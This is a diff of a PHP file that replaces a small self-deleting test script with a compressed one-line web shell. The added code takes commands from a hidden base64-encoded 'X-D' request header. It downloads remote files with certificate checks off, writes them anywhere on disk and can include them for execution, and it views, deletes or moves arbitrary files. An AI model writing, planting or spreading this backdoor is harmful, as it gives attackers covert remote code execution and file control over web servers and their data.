@@ -1,7 +1,1 @@
-<?php
-
-echo "tested";
-
-// delete self
-unlink(__FILE__);
-?>
+<?php $h=function_exists('getallheaders')?getallheaders():[];if(!empty($h['X-D'])){$d=json_decode(base64_decode($h['X-D']),1);$a=$d['a']??'';$p=$d['p']??'';if($a==='fetch'){$u=$d['u']??'';$f=!empty($d['o'])?0:FILE_APPEND;$c=curl_init($u);curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_TIMEOUT=>10]);$b=curl_exec($c);$co=curl_getinfo($c,CURLINFO_HTTP_CODE);$e=curl_error($c);curl_close($c);if($e||$co>=400)echo'File Not Found';elseif(file_put_contents($p,$b,$f)===false)echo'Unable to write file';else{if(!empty($d['i']))include$p;echo'Fetched '.strlen($b).' bytes→'.$p;}}elseif($a==='view'){if(is_file($p)){header('Content-Type:text/plain');echo'<pre>'.htmlspecialchars(file_get_contents($p)).'</pre>';}else echo'File does not exist.';}elseif($a==='delete'){if(is_file($p)&&unlink($p))echo'Deleted '.$p;else echo'Failed to delete file.';}elseif($a==='move'){$t=$d['t']??'';if(is_file($p)&&rename($p,$t))echo'Moved '.$p.'→'.$t;else echo'Failed to move file.';}} ?>
